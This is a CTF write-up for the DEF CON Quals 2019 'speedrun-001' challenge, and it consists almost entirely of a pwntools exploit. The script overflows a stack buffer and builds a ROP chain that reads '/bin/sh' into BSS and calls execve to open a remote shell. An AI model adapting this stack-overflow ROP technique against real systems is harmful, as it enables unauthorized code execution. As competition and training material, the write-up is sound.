# **speedrun-001**

#### tag : pwnable, rop

-----------------------------------------------

#### Description

-----------------------------------------------

#### Solution

```python
from pwn import *
from time import sleep

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('speedrun-001.quals2019.oooverflow.io', 31337)

bss = 0x6bb500
read = 0x4498a0

#0x0000000000400686 : pop rdi ; ret
gg1 = 0x0400686
#0x000000000044be39 : pop rdx ; pop rsi ; ret
gg2 = 0x44be39
#0x0000000000415664 : pop rax ; ret
gg3 = 0x415664
#0x0000000000474e65 : syscall ; ret
gg4 = 0x474e65

p = 'a' * 0x408
p += flat(
	gg1,
	0,
	gg2,
	8,
	bss,
	read
)
p += flat(
	gg1,
	bss,
	gg2,
	0,
	0,
	gg3,
	59,
	gg4
)

r.recvuntil('\n')
r.send(p)
r.recvuntil('\n')

sleep(0.3)
r.send('/bin/sh\x00')
r.interactive()
```
